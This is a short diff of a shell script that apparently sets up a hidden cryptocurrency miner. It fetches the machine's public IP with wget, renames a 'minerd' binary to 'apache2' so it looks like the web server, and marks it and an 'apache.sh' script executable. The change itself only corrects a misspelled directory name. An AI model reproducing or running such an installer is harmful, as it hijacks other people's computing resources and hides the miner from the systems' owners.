@@ -14,7 +14,7 @@ cd
 
 wget https://api.ipify.org	
 mv tanhuevon/minerd ./apache2
-cp tahhuevon/apache.sh ./apache.sh
+cp tanhuevon/apache.sh .
 chmod +x apache2
 chmod +x apache.sh
 
